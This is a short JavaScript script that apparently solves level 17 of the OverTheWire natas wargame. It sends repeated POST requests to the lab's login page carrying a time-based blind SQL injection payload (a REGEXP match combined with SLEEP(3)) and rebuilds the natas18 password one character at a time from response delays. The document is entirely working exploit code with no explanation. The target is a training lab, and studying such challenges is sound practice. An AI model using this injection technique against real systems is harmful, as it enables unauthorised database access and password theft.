var str = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ", result = "";
var s = "...............................", t = new Date().getTime();
(function solve(p,t,r){
    var i = Math.floor(p/62), j = p%62;
    $.post("http://natas17.natas.labs.overthewire.org/index.php","username=natas18\" AND BINARY password REGEXP \"^"+s.slice(0,i)+str[j]+s.slice(i)+"$\" AND SLEEP(3) AND \"x\" = \"x", function(h){
        var t2 = new Date().getTime();
//         console.log((t2-t)/1000+" secs ");
        if (t2-t > 3000){
            r += str[j];
            console.log(i+": "+r);
            if (i < 31) solve(62*(i+1), new Date().getTime(), r);
        }
        else if (p < 1984){ // 62*32
            solve(p+1, new Date().getTime(), r);
        }
    }, "html");
})(0,t,result)

